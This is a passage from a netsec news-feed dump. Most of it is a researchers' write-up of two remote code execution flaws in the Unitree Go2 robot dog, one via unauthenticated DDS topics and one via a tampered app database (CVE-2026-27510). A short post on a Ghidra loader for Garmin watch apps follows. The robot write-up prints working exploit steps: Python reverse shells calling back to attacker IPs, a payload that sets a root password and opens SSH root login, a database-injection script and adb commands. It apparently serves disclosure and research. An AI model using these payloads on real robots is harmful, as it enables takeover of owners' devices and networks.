time.time() &lt; timeout:\n    samples = reader.take(10)\n    for sample in samples:\n        if hasattr(sample, 'header') and sample.header.identity.id == req_id:\n            code = sample.header.status.code\n            if code == 0:\n                print(\"upload ok\")\n                print(\"start listener &amp; press R1+Y on controller\")\n            else:\n                print(f\"failed: {code}\")\n            got_response = True\n            break\n    if got_response:\n        break\n    time.sleep(0.1)\n\nif not got_response:\n    print(\"no response conf file write and .txt change\")</code></pre><p>Successful exploitation will result in the following output.</p><p>After the exploit runs, the  directory contains a new file , and the contents of  will show a mapped  binding pointing to the chunked  content.</p><p>If we go back to our  we'll see the following.</p><p>The initial access isn't captured in the  output. We'll look at Wireshark to fill in the blanks. </p><p>During DDS Discovery, the robot broadcasts all its available services to the network. Frame  lists the robot's published topics (data streams it sends out). This reveals a <code>rt/api/programming_actuator/response</code> topic, suggesting a programming service exists, but not showing how to access it. Frame  lists the robot's subscribed topics (what it's listening for). It shows the robot accepts  messages on <code>rt/api/programming_actuator/request</code>. This is the equivalent of the robos blasting to the world with a \"<em>you can send stuff to <code>rt/api/programming_actuator/request</code>, and I'll do stuff with i</em>t\" messages. </p><p>We can see that we (192.168.1.2) subscribed to the  topic by announcing ourselves as a writer. This message effectively tells the robot, \"<em>I am a valid publisher for the <code>rt/api/programming_actuator/request</code> topic. Please accept data from me</em>\". The robot's DDS implementation accepts this subscription because there's no authentication.</p><p>Frame  is where we send out data to the topic. The payload is a JSON object containing our Python reverse shell, which gets delivered via the DDS DATA message.</p><p>The capture shows numerous  and  messages. This is the standard DDS protocol for leaving the network. The robot unregisters all its endpoints, including the  service. The  logs confirm the attack chain. </p><p>We can see the UDP packet arrive, get deserialized from JSON into a  object, and is passed to <code>process_sample(hotkey_manager, sample)</code> for processing. The payload in the network capture matches the application logs.</p><pre><code>2025-10-29 22:32:13,057 - actuator_manager - DEBUG - [actuator_manager] process_sample() sample=Request_(\n  header=RequestHeader_(\n    identity=RequestIdentity_(id=1761748332960, api_id=1002), \n    lease=RequestLease_(id=0), \n    policy=RequestPolicy_(priority=0, noreply=False)\n  ), \n  parameter='{\"program_content\": {\"chunk_index\": 1, \"total_chunk_num\": 1, \n    \"chunk_content\": \"\\\\nimport socket\\\\nimport subprocess\\\\nimport os\\\\n\\\\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\\\n\n    s.connect((\\\\'192.168.1.2\\\\', 4444))\\\\n\n    os.dup2(s.fileno(), 0)\\\\n\n    os.dup2(s.fileno(), 1)\\\\n\n    os.dup2(s.fileno(), 2)\\\\n\n    subprocess.call([\\\\'/bin/bash\\\\', \\\\'-i\\\\'])\\\\n\"}, \n  \"program_uuid\": \"revshell\", \n  \"bind_hotkey\": \"R1+Y\"}', \n  binary=[]\n)</code></pre><p>Now that the robot has logged our payload. We can see it extracted  from the message header. Remember, this  ID informs the robot that this is a \"code upload request\".</p><pre><code>2025-10-29 22:32:13,058 - actuator_manager - DEBUG - [actuator_manager] process_sample() api_id=1002\n2025-10-29 22:32:13,058 - actuator_manager - DEBUG - [actuator_manager] process_sample() identity_id=1761748332960</code></pre><p>It then logs the correlation ID for tracking the response. You can see the robot logs the JSON string (from the  field) again. At this point, the robot has logged your attack twice in different formats 😅.</p><p>The robot then calls <code>update_hotkey_list(bind_hotkey='R1+Y', uuid='revshell')</code>. </p><pre><code>2025-10-29 22:32:13,060 - actuator_manager - DEBUG - [actuator_manager] [hotkeyManager] update_hotkey_list() bind_hotkey=R1+Y\n2025-10-29 22:32:13,061 - actuator_manager - DEBUG - [actuator_manager] [hotkeyManager] update_hotkey_list() uuid=revshell</code></pre><p>Which sets the hotkey  and program UUID .</p><pre><code>2025-10-29 22:32:13,061 - actuator_manager - DEBUG - [actuator_manager] [hotkeyManager] update_hotkey_list() OLD hotkey_list=\n[{'hotkey': 'L1+Y', 'program_uuid': ''}, \n {'hotkey': 'L2+Y', 'program_uuid': ''}, \n {'hotkey': 'R1+Y', 'program_uuid': ''}]</code></pre><p>Before the hotkey binding state change, we can see there were no previous bindings. Then we see it writing our Python payload to disk.</p><pre><code>2025-10-29 22:32:13,062 - actuator_manager - DEBUG - [actuator_manager] [hotkeyManager] create_new_program_file() file_name=/unitree/etc/programming/revshell.py\ncontent has been written to /unitree/etc/programming/revshell.py.\n\n2025-10-29 22:32:13,063 - actuator_manager - DEBUG - [actuator_manager] [hotkeyManager] update_associated_file() file_name=/unitree/etc/programming/hotkey_list.txt\n\n2025-10-29 22:32:13,063 - actuator_manager - DEBUG - [actuator_manager] [hotkeyManager] update_associated_file() file /unitree/etc/programming/hotkey_list.txt content has been updated</code></pre><p>It updates the .</p><pre><code>2025-10-29 22:32:13,064 - actuator_manager - DEBUG - [actuator_manager] [hotkeyManager] update_hotkey_list() NEW hotkey_list=\n[{'hotkey': 'L1+Y', 'program_uuid': ''}, \n {'hotkey': 'L2+Y', 'program_uuid': ''}, \n {'hotkey': 'R1+Y', 'program_uuid': 'revshell'}]</code></pre><p>It then logs the after state, showing that the backdoor is now bound. This acts as a \"success response\" I'm guessing.</p><pre><code>2025-10-29 22:32:13,064 - actuator_manager - DEBUG - [actuator_manager] send_response() api_id=1002\n2025-10-29 22:32:13,065 - actuator_manager - DEBUG - [actuator_manager] send_response() identity_id=1761748332960\n2025-10-29 22:32:13,065 - actuator_manager - DEBUG - [actuator_manager] send_response() code=0\n</code></pre><p>Finally, the robot receives a DDS metadata sample (not actual data). <code>sample=InvalidSample(key=b'\\x00...')</code>. This is DDS housekeeping.</p><pre><code>2025-10-29 22:32:13,166 - actuator_manager - DEBUG - [actuator_manager] samples_number=1\n2025-10-29 22:32:13,166 - actuator_manager - DEBUG - [actuator_manager] process_sample() ------------------------\n2025-10-29 22:32:13,166 - actuator_manager - DEBUG - [actuator_manager] process_sample() sample=InvalidSample(key=b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00', sample_info=SampleInfo(...))</code></pre><p>Now, if we power on our controller and press  simultaneously... </p><p>We can see that the new thread is spawned, running the script <code>/unitree/etc/programming/reveshell.py</code>.</p><h2>New Challenges &amp; Obstacles in Version 1.1.11</h2><p>Unitree asked us to validate the DDS RCE on the V1.1.11 version. After reverting Go2 to the stock image and upgrading to that version, we noticed that the DDS topic broadcasts from the Go2 robot have changed significantly. We went from having  topics to only , and <code>rt/api/programming_actuator/</code> was nowhere to be found. </p><pre><code>[*] Joining DDS domain 0...\n[*] Discovering topics from robot at 192.168.123.161...\n\n1761841554.188194 [0]    6956286: config: //CycloneDDS/Domain/General: 'NetworkInterfaceAddress': deprecated element (CYCLONEDDS_URI+0 line 4)\n\n[+] Found 4 active topics:\n    → rt/api/obstacles_avoid/request\n    → rt/api/sport/request\n    → rt/api/vui/request\n    → rt/wirelesscontroller_unprocessed</code></pre><p>Initially we chalked it up to an update glitch, then assumed Unitree had finally implemented DDS-layer encryption. After some back and forth, we confirmed that wasn't the case... DDS encryption simply wasn't in the release.</p><p>We eventually noticed that V1.1.11's  had <code>EnableTopicDiscoveryEndpoints</code> set to . When disabled, the built-in discovery endpoint is never created. Our understanding is that participants can still communicate on topics they already know about, but passive enumeration of the topic space via RTPS is no longer possible. </p><p>Topics on V1.1.11 simply aren't discoverable via RTPS without the certificate bearing the hardcoded keys. After many failed attempts to build out a full three-plugin harness with the CA cert, identity cert, and private key, topics remained undiscoverable.</p><pre><code>      &lt;Authentication&gt;\n        &lt;Library initFunction=\"init_authentication\" finalizeFunction=\"finalize_authentication\" \n                 path=\"./libdds_security_auth.so\"/&gt;\n        &lt;IdentityCA&gt;file:./u9tnkSyytqlJ.crt&lt;/IdentityCA&gt;\n        &lt;IdentityCertificate&gt;file:./avsW9qEwxwLs.crt&lt;/IdentityCertificate&gt;\n        &lt;PrivateKey&gt;file:./NEWISjkkqOHK.crt&lt;/PrivateKey&gt;\n      &lt;/Authentication&gt;</code></pre><p>On the Go2 Air, only  topics were visible and the V1.1.7 exploit didn't work. The EDU build of V1.1.11, however, remains vulnerable.</p><p>We don't have access to the EDU firmware, so the DDS RCE exploit died with V1.1.11, but we still wanted to find a way to root it. </p><p>We grabbed an old Pixel phone Ruikai had lying around, rooted it with <a href=\"https://github.com/topjohnwu/Magisk/releases/tag/v29.0?ref=boschko.ca\" rel=\"noreferrer\">Magisk</a>, and installed the <a href=\"https://github.com/NVISOsecurity/AlwaysTrustUserCerts?ref=boschko.ca\" rel=\"noreferrer\">AlwaysTrustUserCerts</a> module. From there we dropped a <a href=\"https://caido.io/?ref=boschko.ca\" rel=\"noreferrer\">Caido</a> certificate on the device to intercept traffic, spun up a Frida server, and threw  certificate pinning bypass at it. The Unitree Go2 app launched cleanly &amp;  started routing straight through our proxy.</p><p>We did this hoping to intercept traffic or inject JavaScript into Unitree's . To get to the console, connect to the Go2 via the app and tap the top-right corner until the green  button appears in the bottom right.</p><p>When clicked, we get access to the debugging console, where we can send JavaScript commands.</p><p>Turns out the traffic is completely internal, originating from a subnet running inside the Go2 so none of it was hitting Caido. What we expected to see was a response structure on localhost looking something like:</p><pre><code>REQUEST_BODY\n{\"api_id\": 1001, \"data\": \"\", \"id\": 80056, \"topic\": \"rt/api/motion_switcher/request\"}\nwindow.ZHBridge.Core.callJsHandler({name: \"appSendCmdToGo2\",args: {\n  topic: \"rt/api/sport/request\"\n  api_id: 1030,\n  data: \"\", id: 436472, priority: 0, length: 7\n},argsCount: 7})\n\nRESPONSE_BODY\n{\"type\": \"res\", \"topic\": \"rt/api/motion_switcher/response\", \"data\": {\"header\": {\"identity\": {\"api_id\": 1001, \"id\": 80056}, \"status\": {\"code\": 0}}, \"data\": \"{\"form\":\"0\",\"name\":\"mcf\"}\"}}</code></pre><p>While the research from that rabbit hole deserves its own post, it's this setup that led us to the second RCE.</p><p>After a few hours of nothing &amp; a trip to Chipotle, we decided to look into .</p><p>More specifically  lets users pre-program the same tasking ability we were abusing over DDS. This was on our radar from the start &amp; anything code-adjacent scratched that itch in the back of your brain.</p><p>The image below makes the DDS RCE much easier to visualize. You can drag and drop motion, action, light, mode, and media tasks into a Scratch-like sequential programming interface. Its essentially a big AutoHotkey script, but for a robot dog.</p><p>Sometimes it feels like the stars align. Turns out the only way to run these programs on the robot is to assign them to the same 3 keybinds the  could use during our DDS RCE , , and  😅 This is how the  is mapped by the end user via the Unitree app UI. </p><p>At this point we had a good feeling we were back on the same vulnerable code path. What we needed to understand was how the saved files worked: how they were stored, how they were executed, and whether we could manipulate their contents.</p><p>We looked around a little longer and discovered that any user can upload their created scripts/programs to a shared marketplace &amp; after some unknown process/time they get approuved and anyone can download &amp; run them. </p><blockquote><u>One critical note before moving on: There's a social and marketplace angle to this vulnerability that carries real mass compromise opportunities.</u></blockquote><p>We poked around to see what other users were uploading &amp; looking at the intercept capture we saw the following... Holy shit.</p><p>After seeing this, I walked over to Ruikai, Frisbeed my laptop on his desk, and we both hit a simultaneous \"LET'S FUCKING GOOOOOOOO\" on instinct. As one does. For context, it was 11 PM, and I was flying home the next day. The clock is a cruel tyrant, but in that moment, time bent the knee.</p><p>The Go2 translates those visual programming blocks into Python and executes it directly through the same  module 🕺 accepting a JSON payload with both the block representation and code, then running it straight through its internal  interpreter.</p><p>At this point, we have an RCE... we just need to \" RCE.</p><h2>Not All That Glitters is Gold</h2><p>Unitree is running a Tencent Cloud EdgeOne WAF, so you can catch a  if you aren't careful. </p><p>Our goal is to inject our raw Python code into the  field of the JSON payload</p><p>Modifying the create request in-flight doesn't overwrite the code stored in the phone's local DB (expected &amp; makes sense). The only way to inject our Python was to first create a simple program (), intercept the subsequent rename POST request, and modify both the name (to ) and the  body at that point. The record was already created in the database by then, so the modification should stick.</p><p>Looking at the content, the segment still hasn't changed to that of our malicious Python code.</p><p>We looked at the community programming hub. </p><p>We can tamper with the Publish POST request, and this time all modifications to the program body work. The only problem is the published program lands in a private \"myself\" endpoint ( in the UI) and requires approval before going public. We can't run it by mapping it to a keybinding. </p><p>While under review, the program can't be downloaded by anyone, including ourselves. It is, however, indexable. In our case,  was assigned ID .</p><p>Trying to download it returns a successful response, but nothing \"gets downloaded to our Programming scripts library</p><p>Our malicious payload uploads cleanly and looks downloadable but when under review, the download is a black hole 🙂. </p><h2>Remote Code Execution in Version 1.1.11 (CVE-2026-27510)</h2><p>We don't have time to let Unitree stumble on our vulnerability during whatever their approval process is. So we'll modify the database ourselves. With a rooted phone, editing the table record and reloading it with our malicious  payload isn't a complicated process.</p><p>To obtain the database, run the following  commands. </p><pre><code>adb shell su -c 'cp /data/data/com.unitree.doggo2/databases/unitree_go2.db /sdcard/unitree_go2.db'\n\nadb shell su -c 'cp /data/data/com.unitree.doggo2/databases/unitree_go2.db-wal /sdcard/unitree_go2.db-wal 2&gt;/dev/null'\n\nadb pull /sdcard/unitree_go2.db ./\n\nadb pull /sdcard/unitree_go2.db-wal ./ 2&gt;/dev/null\n\nadb shell rm /sdcard/unitree_go2.db*</code></pre><p>The record we'll be injecting our malicious code into lives in the database tables. In our case it's named . A quick look confirms it's there.</p><p><code>sqlite3 unitree_go2.db \"SELECT _id, programme_name FROM dog_programme;\"</code></p><p>To view the contents of any program named above, run the following.</p><p><code>sqlite3 unitree_go2.db \"SELECT json_extract(programme_text, '$.pyCode') FROM dog_programme WHERE programme_name='olivier';\"</code></p><p>The goal here is to change out the current  values with our own. </p><pre><code>9|olivier|{\"data\":\"{\\\"blocks\\\":{\\\"languageVersion\\\":0,\\\"blocks\\\":[{\\\"type\\\":\\\"start_program\\\",\\\"id\\\":\\\"*5DXb;WCH;#=G*@NK|1L\\\",\\\"x\\\":100,\\\"y\\\":100,\\\"deletable\\\":false,\\\"inputs\\\":{\\\"ACTION\\\":{\\\"block\\\":{\\\"type\\\":\\\"stretch_command\\\",\\\"id\\\":\\\"\nn-;yWgf/ALkS.bj6CuAJ\\\"}}}}]}\",\\\"pyCode\\\":\\\"===OUR MALICIOUS CODE HERE===\"}</code></pre><p>To easily achieve this, save the following code as .</p><figure><pre><code>#!/usr/bin/env python3\n\"\"\"\nUtility for updating a Unitree GO custom programme's Python payload inside unitree_go2.db.\n\nExample:\n  python modify_db_v1.1.11_rce.py --db unitree_go2.db --programme olivier --pycode new_payload.py\n\"\"\"\n\nimport argparse\nimport json\nimport sqlite3\nimport time\nfrom pathlib import Path\n\n\ndef load_args() -&gt; argparse.Namespace:\n    parser = argparse.ArgumentParser(description=\"Update the pyCode of a Unitree GO custom programme.\")\n    parser.add_argument(\n        \"--db\",\n        required=True,\n        type=Path,\n        help=\"Path to unitree_go2.db (works with a WAL file alongside it).\",\n    )\n    parser.add_argument(\n        \"--programme\",\n        required=True,\n        help=\"Value of dog_programme.programme_name to update (e.g. dick).\",\n    )\n    parser.add_argument(\n        \"--pycode\",\n        required=True,\n        type=Path,\n        help=\"Path to the Python source to inject into programme_text['pyCode'].\",\n    )\n    parser.add_argument(\n        \"--touch-time\",\n        action=\"store_true\",\n        help=\"Bump programme_time to the current epoch millis (matches app behaviour).\",\n    )\n    return parser.parse_args()\n\n\ndef main() -&gt; None:\n    args = load_args()\n\n    if not args.db.exists():\n        raise SystemExit(f\"Database not found: {args.db}\")\n    if not args.pycode.exists():\n        raise SystemExit(f\"pyCode file not found: {args.pycode}\")\n\n    new_pycode = args.pycode.read_text()\n\n    with sqlite3.connect(args.db) as conn:\n        conn.row_factory = sqlite3.Row\n        row = conn.execute(\n            \"SELECT _id, programme_text, programme_time FROM dog_programme WHERE programme_name = ?\",\n            (args.programme,),\n        ).fetchone()\n        if row is None:\n            raise SystemExit(f\"No programme named {args.programme!r} in dog_programme.\")\n\n        try:\n            payload = json.loads(row[\"programme_text\"])\n        except json.JSONDecodeError as exc:\n            raise SystemExit(f\"programme_text for {args.programme!r} is not valid JSON: {exc}\") from exc\n\n        if \"pyCode\" not in payload:\n            raise SystemExit(\"programme_text does not contain a 'pyCode' field to update.\")\n\n        payload[\"pyCode\"] = new_pycode\n        new_programme_time = int(time.time() * 1000) if args.touch_time else row[\"programme_time\"]\n\n        conn.execute(\n            \"UPDATE dog_programme SET programme_text = ?, programme_time = ? WHERE _id = ?\",\n            (json.dumps(payload, separators=(\",\", \":\")), new_programme_time, row[\"_id\"]),\n        )\n        conn.commit()\n\n    print(f\"Updated programme '{args.programme}' in {args.db}\")\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre></figure><p>Create a file called  containing any Python code you want the Go2 to execute. In our case, we used a reverse shell.</p><figure><pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.179\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")\n</code></pre></figure><p>This can truly be whatever you want. You can run the following to enable SSH with  credentials. </p><figure><pre><code>import os;os.system(\"echo 'root:pwn0'|chpasswd;sed -i -e 's/^#*PermitRootLogin.*/PermitRootLogin yes/' -e 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' -e 's/^#*MaxSessions.*/MaxSessions 50/' -e 's/^#*MaxStartups.*/MaxStartups 50:30:100/' /etc/ssh/sshd_config;grep -q MaxSessions /etc/ssh/sshd_config||echo -e 'MaxSessions 50\\nMaxStartups 50:30:100'&gt;&gt;/etc/ssh/sshd_config;systemctl restart ssh||service ssh restart||/etc/init.d/ssh restart\")</code></pre></figure><p>Run the POC code as seen below. </p><p>After running the script, check the contents of that table. <code>sqlite3 unitree_go2.db \"select _id, programme_name, programme_text from dog_programme where programme_name='olivier';\"</code></p><p>If we were to simply reupload the modified database to our Pixel, we would get a <code>SQLiteCantOpenDatabaseException</code> error because the database file <code>/data/data/com.unitree.doggo2/databases/unitree_go2.db</code> will have the wrong owner. That's because Android apps run under specific user IDs and can only access files they own. To find out the correct app user ID, run the following: <code>adb shell su -c 'ls -ld /data/data/com.unitree.doggo2/databases'</code></p><p>Cool, so when we copy the database back, it'll have the correct ownership (). To upload it back to the phone, run the following commands.</p><pre><code>adb push unitree_go2.db /sdcard/unitree_go2.db\n\nadb shell su -c 'cp /data/data/com.unitree.doggo2/databases/unitree_go2.db /data/data/com.unitree.doggo2/databases/unitree_go2.db.bak'\n \nadb shell su -c 'cp /sdcard/unitree_go2.db /data/data/com.unitree.doggo2/databases/unitree_go2.db'\n\nadb shell su -c 'chown u0_a215:u0_a215 /data/data/com.unitree.doggo2/databases/unitree_go2.db'\n\nadb shell su -c 'chmod 660 /data/data/com.unitree.doggo2/databases/unitree_go2.db'\n\nadb shell su -c 'restorecon /data/data/com.unitree.doggo2/databases/unitree_go2.db'\n\nadb shell su -c 'rm -f /data/data/com.unitree.doggo2/databases/unitree_go2.db-wal'\n\nadb shell su -c 'rm -f /data/data/com.unitree.doggo2/databases/unitree_go2.db-shm'\n\nadb shell rm /sdcard/unitree_go2.db</code></pre><p>You can verify the app works by running <code>adb shell monkey -p com.unitree.doggo2 -c android.intent.category.LAUNCHER 1</code> and you can run <code>adb shell pidof com.unitree.doggo2</code> to obtain the PID of the running app.</p><p>The  program contains our malicious Python. In the app, we map it to controller keybinds as seen below.</p><p>Power on the controller, start a listener, and press whatever keybindings you've set the program to (any green+red arrow).</p><p>Once we had the shell, listing the processes confirmed it was triggered by the same underlying code. Instead of the  we uploaded via DDS its <code>17618826598817f6dc19f-0dee-4749-b5bd-35f6c4b8816f.py</code>.</p><p>As the screenshots below show, it behaves practically identically to the DDS RCE on V1.1.7. The malicious code is uploaded as a file to <code>/unitree/etc/programming/</code>, mapped to a keybinding, and when pressed, the Go2 is popped.</p><blockquote>You've made it to the end!</blockquote><p> Follow <a href=\"https://x.com/ruikai?ref=boschko.ca\" rel=\"noreferrer\">Ruikai</a> and <a href=\"https://x.com/olivier_boschko?ref=boschko.ca\" rel=\"noreferrer\">me</a> on X. Reach out if you have any questions. We might drop technical details on the other Go2 vulnerabilities depending on how this blog does. We're always down to collaborate on projects, simply ping us!</p>","contentLength":47052,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1rfjjfc/from_dds_packets_to_robot_shells_two_rces_in/"},{"title":"Reverse Engineering Garmin Watch Applications with Ghidra","url":"https://www.anvilsecure.com/blog/reverse-engineering-garmin-watch-applications-with-ghidra.html","date":1772122505,"author":"/u/anvilventures","guid":154099,"unread":true,"content":"<p>Garmin smartwatches have quietly evolved into powerful embedded platforms. Beneath the fitness metrics, navigation features, and custom watch faces lie a proprietary Garmin Virtual Machine which executes third-party applications compiled from Garmin’s Monkey C language. These applications are normally distributed through the Connect IQ Store where  binaries are installed directly on the device.</p><p>For reverse engineers, those  files present several challenges, such as lack of documented format, custom virtual machine, and no native support in mainstream reverse-engineering tools.</p><p>In the <a href=\"https://www.anvilsecure.com/blog/compromising-garmins-sport-watches-a-deep-dive-into-garminos-and-its-monkeyc-virtual-machine.html\" target=\"_blank\" rel=\"noopener\">previous Anvil research project</a>, our Director of Research, Tao Sauvage, identified several vulnerabilities while going through Garmin VM opcodes and internal routines. His research allowed insights into the Garmin VM internal details, opening rooms for further studies.</p><p>During a <a href=\"https://www.anvilsecure.com/blog/behind-the-scenes-at-hammercon-2025-the-ctf-challenge.html\" target=\"_blank\" rel=\"noopener\">Hammercon Capture The Flag event</a>, a reverse engineering challenge involving a Garmin watch application (PRG) served as the spark that initiated the development of a new tool.</p><p>We are introducing a <strong>Ghidra processor definition and loader for Garmin watch applications</strong>, designed to analyze Garmin PRG binaries inside Ghidra with structured headers, disassembly, decompilation, and meaningful symbols. </p><div><h3>Put the GhidraGarminApp to Work in the 2025 HammerCon CTF</h3><p>At Anvil, we like to turn one-off challenges into reusable tooling. To make the above tool release more hands-on, we’re also publishing the original 2025 HammerCon CTF challenge so you can take the GhidraGarminApp for a spin right away.</p><p>👉 Download the original 2025 HammerCon Garmin CTF file here: <a href=\"https://www.anvilsecure.com/wp-content/uploads/2026/02/Garmax.zip\">Garmax.zip</a></p></div><h2>Garmin Connect IQ Applications: What Are We Analyzing?</h2><p>Garmin’s  allows developers to create applications that run directly on wearable devices and other Garmin hardware. These applications fall into several categories:</p><ul><li> - custom home screens</li><li> - additional metrics during activities</li><li> - glanceable information views</li><li> - full standalone applications</li><li> - applications for Edge, Marine, and other devices</li></ul><p>All of these are written in , compiled using the Connect IQ SDK, and distributed to devices as  binaries.\nCurrently, the Ghidra extension supports only Garmin Watch Applications; other types were not fully tested.</p><p>In his <a href=\"https://www.anvilsecure.com/blog/compromising-garmins-sport-watches-a-deep-dive-into-garminos-and-its-monkeyc-virtual-machine.html\" target=\"_blank\" rel=\"noopener\">previous research</a>, Tao Sauvage released a Kaitai structure file allowing parsing and understanding of Garmin PRG binary.</p><p>Kaitai Struct is an excellent tool for describing and parsing binary formats, and it does an amazing job understanding the high-level layout of Garmin PRG files. However, format parsing alone does not translate into a usable reverse-engineering workflow.\nIt lacks reference, context, functions, renaming and annotations, and makes reverse engineering tedious and time-consuming.</p><p>This is where Ghidra fundamentally changes the equation. By defining a processor, instruction semantics, and a format-aware loader, Ghidra turns static layout knowledge into executable understanding by outlining:</p><ul><li>Instruction decoding and disassembly</li><li>Control-flow and cross-reference generation</li><li>Decompilation into higher-level logic</li><li>Data types that are directly referenced by code</li><li>A navigable program graph rather than a parsed file</li></ul><h2>A Garmin VM Processor Definition for Ghidra</h2><p>To make Ghidra understand Garmin watch applications, this project introduces a <strong>new processor definition representing the Garmin virtual machine</strong> used by PRG binaries.</p><p>Ghidra allows the creation of new processor using the <strong>SLEIGH specification language</strong>. This makes it possible to describe, instruction encodings, operand formats, registers, calling conventions, memory alignment, and instruction semantics useful during de-compilation.</p><p>This processor definition allows Ghidra to correctly disassemble Garmin bytecode, associate opcodes with meaningful operations, and enable decompilation using the SLEIGH-defined semantics. While all opcodes are handled, not all of them are 100% semantically correct in SLEIGH language. However, a decent level of semantics exist to allow , even if the output is sometimes imperfect.</p><pre><code>Garming Virtual Machine</code></pre><h2>Beyond a Processor: A Custom PRG Loader</h2><p>A processor alone is not sufficient. PRG binaries have headers, object definitions, fields, and metadata that must be parsed and applied during import to have a good understanding of the binary.</p><p>The custom loader was designed and built based on the Kaitai structure and adds the following capabilities:</p><ul><li>Recognizing Garmin  files during import</li><li>Creating appropriate memory blocks</li><li>Setting the correct image base and entry point</li><li>Parsing known header structures</li><li>Registering data types inside Ghidra’s Data Type Manager</li><li>Labeling known offsets and functions when possible</li><li>Identifying strings and create reference to them</li><li>Attempting to resolve relative offset and symbol values pointers</li></ul><h2>What You See After Loading a PRG</h2><p>Once a PRG file is imported, if the file is a valid PRG file, then Ghidra will identify it and load it accordingly:</p><p>Well-known functions are already re-named accordingly and presented to the user, as well as string pointers and symbols.</p><h3>Structured Program Layout</h3><p>Memory is divided into several regions, data section, code section, symbols, sdk.data, sdk.code and sdk.native.</p><h3>Object and Class Definitions</h3><p>PRG binaries contain embedded module definitions. These are extracted and represented as structures inside Ghidra, allowing analysts to explore application logic at a higher level. While symbol value references are not yet fully resolved within the code section, the presence of these definitions improves readability and make browsing through the code much easier. An example is provided below:</p><p>All known opcodes have a SLEIGH definition, enabling Ghidra’s decompiler. Some instructions still lack full semantic detail, so decompiled output may not always be perfect. As shown below, some opcodes do not have a semantic representation yet but they were left as pcode within the decompiler. This is still a work in progress.</p><p>The PRG header is parsed into multiple structures, primarily  and . Not all fields are currently highlighted, but the groundwork is in place. While you may not yet see in Ghidra, fields such as ,  or , the information is in there, but just not highlighted as in the Kaitai structure (it will be in the future releases).</p><h2>Current Limitations and Next Steps</h2><ul><li>Highlight more structure fields for better readability</li><li>Mapping symbol values to module functions during operations such as (. GETLOCALV)</li><li>Version-specific handling of PRG binaries</li><li>Improved opcode semantics for better decompilation</li><li>Testing loader against other Garmin applications</li></ul><p>Modern wearable devices are no longer simple accessories, they are network-connected computing platforms that process sensitive personal data and execute third-party code. As these systems grow in complexity, understanding how they work at a low level becomes very important.</p><p>By bringing native support for Garmin watch applications into Ghidra, this project aims to lower the barrier to meaningful analysis and encourage responsible security research. Providing researchers with better tools leads to better understanding, better disclosures, and ultimately more secure systems.</p><p><em>If you’ve ever wanted to see what really runs on your watch, this is where that journey starts.</em></p>","contentLength":7219,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1rfeee1/reverse_engineering_garmin_watch_applications/"}],"tags":["netsec"]}